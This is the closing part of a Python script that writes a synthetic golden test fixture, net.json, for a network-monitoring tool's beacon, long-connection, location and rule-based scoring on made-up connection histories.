    "_note": "SYNTHETIC: Vigil 1's network scoring and alert wording on made-up connection histories, in UTC. "
             "Regenerate with make_golden.py.",
    "t0": T0, "now": NOW, "series": SERIES, "beacon_stats": beacon, "beacon_findings": beacon_f,
    "long": {"cases": LONG, "findings": long_f}, "location": {"cases": {k: [i, key] for k, (i, key) in LOC.items()},
                                                             "findings": loc_f},
    "rules": {"user": USER_RULES, "pairs": PAIRS, "hits": rule_hits},
    "context": {"programs": PROGS, "destinations": DESTS,
                "prevalence": {k: list(v) for k, v in CTX["prevalence"].items()}},
    "pairs": pair_out,
}, indent=1, ensure_ascii=False, sort_keys=True) + "\n")
print(f"wrote {OUT / 'net.json'}: {len(SERIES)} series, {len(CASES)} scored pairs")
